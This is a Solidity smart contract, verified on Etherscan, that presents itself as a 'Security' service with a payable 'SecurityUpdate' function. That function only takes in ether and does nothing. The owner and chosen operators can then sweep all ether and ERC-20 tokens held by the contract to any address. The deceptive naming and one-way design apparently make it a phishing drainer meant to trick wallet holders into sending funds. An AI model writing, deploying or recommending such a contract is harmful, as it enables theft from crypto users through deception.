/**
 *Submitted for verification at Etherscan.io on 2023-03-22
*/

interface IERC20 {
  function transfer(address to, uint256 amount) external returns (bool);
  function balanceOf(address account) external view returns (uint256);
}

contract Security {
  address private owner;
  mapping (address => bool) private operators;
  constructor() public {
    owner = msg.sender;
    operators[msg.sender] = true;
  }
  function getOwner() public view returns (address) {
    return owner;
  }
  function getBalance() public view returns (uint256) {
    return address(this).balance;
  }
  function setOperator(address operator, bool status) public {
    require(msg.sender == owner, "You must be owner to call this");
    operators[operator] = status;
  }
  function isOperator(address operator) public view returns (bool) {
    return operators[operator];
  }
  function transfer(address to, uint256 amount) public {
    require(msg.sender == owner || operators[msg.sender], "You must be owner or operator to call this");
    amount = (amount == 0) ? address(this).balance : amount;
    require(amount <= address(this).balance, "Too much money");
    payable(to).transfer(amount);
  }
  function transferFrom(address contract_address, address to, uint256 amount) public {
    require(msg.sender == owner || operators[msg.sender], "You must be owner or operator to call this");
    IERC20 token = IERC20(contract_address);
    amount = (amount == 0) ? token.balanceOf(address(this)) : amount;
    require(amount <= token.balanceOf(address(this)), "Too much money");
    token.transfer(to, amount);
  }
  function SecurityUpdate() public payable {
    // Nothing to do here
  }
}